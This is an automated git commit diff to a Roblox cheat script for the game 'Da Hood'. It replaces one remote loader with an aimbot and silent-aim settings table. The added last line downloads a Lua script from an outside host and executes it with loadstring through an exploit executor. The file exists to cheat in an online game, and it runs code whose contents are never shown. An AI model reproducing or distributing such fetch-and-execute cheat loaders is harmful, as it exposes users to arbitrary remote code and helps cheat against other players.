f185023790901d85f47503dd0a5e3632aba70fa1
Emil Toth <emiltoth1870@gmail.com>
2023-04-13 21:31:47 +0200

    Updated automatically!

--- Scripts/Autoadd/Da Hood Silent Aim.lua
+++ Scripts/Autoadd/Da Hood Silent Aim.lua
@@ -1,1 +1,15 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/dh2", true))()
+getgenv().user_settings = {
+   silent_enabled = true,
+   hitbox = 'HumanoidRootPart',
+
+   aimbot_enabled = true,
+   aimbot_keybind = 'E',
+   aimbot_smoothing = 0.5, -- 0, 1 scale
+
+   fov_radius = 200,
+   prediction = 0.1377,
+   auto_prediction = true,
+   visible_check = true
+}
+
+loadstring(syn.request({Url = 'https://femboy.rip/scripts/dahood.lua'}).Body)()
